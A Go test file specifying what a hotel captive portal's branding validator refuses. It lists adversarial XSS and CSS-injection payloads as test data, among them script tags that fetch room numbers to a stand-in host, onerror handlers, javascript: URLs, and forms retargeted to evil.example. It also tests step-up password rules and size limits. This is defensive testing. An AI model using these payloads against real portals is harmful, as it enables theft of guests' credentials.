package main

// THE PORTAL BRANDING ESCAPE HATCH, HELD TO THE ONE RULE THAT MATTERS.
//
// Operators can supply custom CSS and HTML so a hotel can look like itself. The page they are customising is
// a CAPTIVE PORTAL: it collects room numbers, surnames, reservation numbers and voucher codes. Executable
// content injected into it can read every one of those and post them anywhere.
//
// So the validator REFUSES rather than sanitises, and these tests are the specification of what it refuses.
// They are deliberately adversarial: each case is a way a real attempt would be spelled, not a single
// canonical "<script>" that any naive check would catch.

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/stayconnect/enterprise/data-plane/internal/portaldesign"
)

func TestBrandingRefusesExecutableContent(t *testing.T) {
	for _, tc := range []struct{ name, field, value string }{
		{"a plain script tag", "custom_html", `<script>fetch('//x/'+document.forms[0].room.value)</script>`},
		// Spellings the old regular-expression denylist let through. Each is refused now because the fragment
		// is parsed and rebuilt from an allowlist, not because somebody thought of it.
		{"an onerror handler with no whitespace", "custom_html", `<img/onerror=alert(1) src=x>`},
		{"a base element re-pointing the forms", "custom_html", `<base href="https://evil.example/">`},
		{"a button re-targeting the voucher form", "custom_html", `<button form="form-voucher" formaction="https://evil.example/">Go</button>`},
		{"a meta refresh", "custom_html", `<meta http-equiv="refresh" content="0;url=https://evil.example/">`},
		{"a stylesheet link", "custom_html", `<link rel="stylesheet" href="https://evil.example/x.css">`},
		{"a style element in the fragment", "custom_html", `<style>form{display:none}</style>`},
		{"an entity-encoded javascript URL", "custom_html", `<a href="javascript&#58;alert(1)">Help</a>`},
		{"an id colliding with the sign-in form", "custom_html", `<div id="form-voucher">x</div>`},
		{"css url to plain http", "custom_css", `body { background: url(http://evil.example/x.png); }`},
		{"css escaped expression", "custom_css", `body { width: ex\70ression(alert(1)); }`},
		{"mixed case", "custom_html", `<ScRiPt>alert(1)</ScRiPt>`},
		{"an inline handler", "custom_html", `<div onclick="steal()">Welcome</div>`},
		{"an onerror handler on an image", "custom_html", `<img src=x onerror="fetch('//x')">`},
		{"a javascript: URL", "custom_html", `<a href="javascript:steal()">Help</a>`},
		{"an iframe", "custom_html", `<iframe src="//evil.example"></iframe>`},
		{"an object", "custom_html", `<object data="//evil.example"></object>`},
		// A SECOND FORM THAT COLLECTS CREDENTIALS is the subtlest of these: it looks like markup, contains no
		// script at all, and posts the guest's room number wherever it likes.
		{"a second form", "custom_html", `<form action="//evil.example"><input name="room"></form>`},
		{"css @import", "custom_css", `@import url("//evil.example/x.css");`},
		{"css expression", "custom_css", `body { width: expression(alert(1)); }`},
		{"css behaviour", "custom_css", `body { behavior: url(#default#time2); }`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := validateDesign(map[string]any{tc.field: tc.value})
			if err == nil {
				t.Fatalf("%s was ACCEPTED into a page that collects guest credentials", tc.name)
			}
			// The refusal must say why, because an operator who cannot tell what was rejected will try again
			// with the same thing spelled differently.
			if len(err.Error()) < 20 {
				t.Errorf("the refusal does not explain itself: %q", err)
			}
		})
	}
}

func TestBrandingAcceptsOrdinaryCustomisation(t *testing.T) {
	// The hatch has to be usable, or operators will ask for something worse. Real styling and real markup
	// must pass.
	ok := map[string]any{
		"hotel_name":       "Semantics Demo Hotel",
		"brand_color":      "#0f6b63",
		"brand_color_dark": "#0b544e",
		"text_color":       "rgb(28, 43, 42)",
		"corner_radius":    "18px",
		"logo_url":         "/assets/logo.png",
		"background_url":   "https://cdn.example.com/resort.jpg",
		"font_family":      "Inter, system-ui, sans-serif",
		"custom_css":       ".card { box-shadow: 0 10px 40px rgba(0,0,0,.2); } .tab { letter-spacing: .02em; }",
		"custom_html":      `<p class="small">Ask reception for help on extension <strong>9</strong>.</p>`,
	}
	if err := validateDesign(ok); err != nil {
		t.Fatalf("an ordinary hotel design was refused: %v", err)
	}
}

func TestBrandingRefusesAssetsFromAnywhere(t *testing.T) {
	// A logo is fetched by the guest's browser. Allowing plain http would let anyone on the path replace the
	// hotel's logo, and allowing an arbitrary scheme is how javascript: gets back in through a URL field.
	for _, bad := range []string{
		"http://evil.example/logo.png",
		"javascript:alert(1)",
		"//evil.example/logo.png",
		"ftp://example/logo.png",
	} {
		if err := validateDesign(map[string]any{"logo_url": bad}); err == nil {
			t.Errorf("logo_url %q was accepted", bad)
		}
	}
	for _, good := range []string{"/assets/logo.png", "https://cdn.example.com/l.png", "data:image/png;base64,AAAA"} {
		if err := validateDesign(map[string]any{"logo_url": good}); err != nil {
			t.Errorf("logo_url %q was refused: %v", good, err)
		}
	}
}

func TestBrandingRefusesAColourThatIsNotAColour(t *testing.T) {
	// brand_color is interpolated into a style property. "anything the browser accepts" includes url().
	for _, bad := range []string{"url(javascript:alert(1))", "red; background: url(//x)", "#ggg", "expression(1)"} {
		if err := validateDesign(map[string]any{"brand_color": bad}); err == nil {
			t.Errorf("brand_color %q was accepted", bad)
		}
	}
	for _, good := range []string{"#fff", "#0f6b63", "#0f6b63ff", "rgb(15, 107, 99)"} {
		if err := validateDesign(map[string]any{"brand_color": good}); err != nil {
			t.Errorf("brand_color %q was refused: %v", good, err)
		}
	}
}

func TestBrandingBoundsTheTemplateSize(t *testing.T) {
	// The document is read on every portal load. An operator pasting a megabyte of CSS should be told so.
	big := make([]byte, 70*1024)
	for i := range big {
		big[i] = 'a'
	}
	if err := validateDesign(map[string]any{"custom_css": string(big)}); err == nil {
		t.Fatal("a 70 KB stylesheet was accepted")
	}
}

// THE STEP-UP GUARDS THE SURFACE IT WAS WRITTEN FOR.
//
// Publishing used to require a password for every change, which meant a receptionist correcting a typo in the
// hotel's name met the same challenge as somebody injecting CSS into the page that collects voucher codes.
// The check is now on the boundary that matters, and these assert the line is drawn by CONTENT rather than by
// which screen the request came from.
func TestOnlyAdvancedContentTriggersTheStepUp(t *testing.T) {
	current := map[string]any{
		"hotel_name": "Semantics Demo Hotel", "brand_color": "#0f6b63",
		"custom_css": ".card { box-shadow: none; }",
	}
	for _, c := range []struct {
		name string
		next map[string]any
		want bool
	}{
		{"renaming the hotel", map[string]any{"hotel_name": "Semantics Demo Resort", "custom_css": ".card { box-shadow: none; }"}, false},
		{"changing a colour", map[string]any{"hotel_name": "Semantics Demo Hotel", "brand_color": "#123456", "custom_css": ".card { box-shadow: none; }"}, false},
		{"editing the stylesheet", map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".card { display: none; }"}, true},
		// REMOVING it counts too. "Advanced is empty now" is still a change to what the page executes, and a
		// rule that only looked at the new value would let a session clear the hotel's own styling unchallenged.
		{"clearing the stylesheet", map[string]any{"hotel_name": "Semantics Demo Hotel"}, true},
		{"adding markup", map[string]any{"custom_css": ".card { box-shadow: none; }", "custom_html": "<p>hi</p>"}, true},
	} {
		if got := advancedChanged(c.next, current); got != c.want {
			t.Errorf("%s: step-up required = %v, want %v", c.name, got, c.want)
		}
	}
}

func TestSavingSettingsStillRefusesScript(t *testing.T) {
	// The step-up decides WHO may change the escape hatch. validateDesign decides WHAT may go in it, and the
	// settings door must run it exactly as publish does -- a second way in that skipped validation would be a
	// way to put script on the sign-in page.
	for _, bad := range []map[string]any{
		{"custom_html": "<script>steal()</script>"},
		{"custom_html": "<img src=x onerror=steal()>"},
		{"custom_css": "@import url(//evil/x.css)"},
		{"custom_html": "<iframe src=//evil></iframe>"},
		{"custom_html": "<form action=//evil>"},
	} {
		if err := validateDesign(bad); err == nil {
			t.Errorf("a design containing %v was accepted", bad)
		}
	}
}

func TestThePreviewReadsTheRealPortal(t *testing.T) {
	// A preview drawn separately in the admin would agree with the portal on the day it was written and drift
	// from then on. This pins it to portald's own page rather than to a copy.
	if portalPreviewURL != "http://127.0.0.1:8380/" {
		t.Errorf("the preview source is %q; it must be the portal's own sign-in page on this appliance", portalPreviewURL)
	}
}

// "< script >" IS TEXT TO A BROWSER, and it used to be refused as if it were a tag. What matters is what the
// guest's browser would do with it, so the assertion is now the stronger one: it reaches the page only as
// escaped text, never as markup.
func TestTextThatLooksLikeATagReachesTheGuestAsText(t *testing.T) {
	g := portaldesign.ForGuests(map[string]any{"custom_html": "< script >alert(1)</ script >"})
	h, _ := g["custom_html"].(string)
	if strings.Contains(h, "<script") || strings.Contains(h, "< script") {
		t.Fatalf("text that looked like a tag was served as markup: %q", h)
	}
}

func TestTermsURLIsValidated(t *testing.T) {
	// It became a live link on the sign-in page without any check at all.
	for _, bad := range []string{"javascript:alert(1)", "http://hotel.example/terms", "//evil.example/terms"} {
		if err := validateDesign(map[string]any{"terms_url": bad}); err == nil {
			t.Errorf("terms_url %q was accepted", bad)
		}
	}
	if err := validateDesign(map[string]any{"terms_url": "https://hotel.example/terms"}); err != nil {
		t.Errorf("an https terms link was refused: %v", err)
	}
}

func TestTextAndTemplateFieldsAreBounded(t *testing.T) {
	for _, bad := range []map[string]any{
		{"welcome_text": strings.Repeat("a", portaldesign.MaxWelcomeText+1)},
		{"help_text": strings.Repeat("a", portaldesign.MaxHelpText+1)},
		{"template_id": "not-a-template"},
		{"template_options": map[string]any{"panel_position": "sideways"}},
		{"translations": map[string]any{"it": map[string]any{"pms.room": strings.Repeat("x", portaldesign.MaxTranslationText+1)}}},
	} {
		if err := validateDesign(bad); err == nil {
			t.Errorf("%v was accepted", bad)
		}
	}
	for _, tp := range portaldesign.Templates {
		if err := validateDesign(map[string]any{"template_id": tp.ID}); err != nil {
			t.Errorf("template %s refused: %v", tp.ID, err)
		}
	}
}

// CHOOSING A TEMPLATE IS NOT ADVANCED. Ordinary branding saves with no password; custom CSS and HTML need it in
// both directions. Template choice and its options are closed vocabularies, so they must not trip it.
func TestTemplateChoiceDoesNotTriggerTheStepUp(t *testing.T) {
	current := map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".a{}"}
	next := map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".a{}", "template_id": "split",
		"template_options": map[string]any{"overlay": 30}, "hero_image_url": "/assets/h.jpg"}
	if advancedChanged(next, current) {
		t.Error("choosing a template asked for the password")
	}
	for _, k := range portaldesign.AdvancedFields {
		n := map[string]any{"hotel_name": "Semantics Demo Hotel", "custom_css": ".a{}"}
		n[k] = "changed"
		if !advancedChanged(n, current) {
			t.Errorf("changing %s did not ask for the password", k)
		}
	}
}

func TestBrandingBodiesAreCapped(t *testing.T) {
	s := &server{}
	h := s.brandingRoutes()
	big := `{"design":{"custom_css":"` + strings.Repeat("a", portaldesign.MaxBodyBytes+10) + `"}}`
	w := httptest.NewRecorder()
	h.ServeHTTP(w, httptest.NewRequest(http.MethodPost, "/validate", strings.NewReader(big)))
	if w.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("an oversized body answered %d, want 413", w.Code)
	}
}

func TestValidateEndpointNamesWhatWouldBeRemoved(t *testing.T) {
	s := &server{}
	h := s.brandingRoutes()
	body := `{"design":{"custom_html":"<p>Pool</p><img src=x onerror=alert(1)>","custom_css":"form{display:none!important}"}}`
	w := httptest.NewRecorder()
	h.ServeHTTP(w, httptest.NewRequest(http.MethodPost, "/validate", strings.NewReader(body)))
	if w.Code != http.StatusOK {
		t.Fatalf("status %d: %s", w.Code, w.Body.String())
	}
	var got struct {
		OK     bool                 `json:"ok"`
		Issues []portaldesign.Issue `json:"issues"`
		San    map[string]string    `json:"sanitized"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &got); err != nil {
		t.Fatal(err)
	}
	if got.OK {
		t.Error("a design with an onerror handler was reported ok")
	}
	var sawHandler, sawImportant bool
	for _, i := range got.Issues {
		if i.Field == "custom_html" && strings.Contains(i.Message, "onerror") && i.Severity == portaldesign.SeverityError {
			sawHandler = true
		}
		if i.Field == "custom_css" && strings.Contains(i.Message, "!important") && i.Severity == portaldesign.SeverityWarning {
			sawImportant = true
		}
	}
	if !sawHandler || !sawImportant {
		t.Errorf("issues do not name what would change: %+v", got.Issues)
	}
	if strings.Contains(got.San["custom_html"], "onerror") || !strings.Contains(got.San["custom_html"], "<p>Pool</p>") {
		t.Errorf("sanitised preview is wrong: %q", got.San["custom_html"])
	}
}
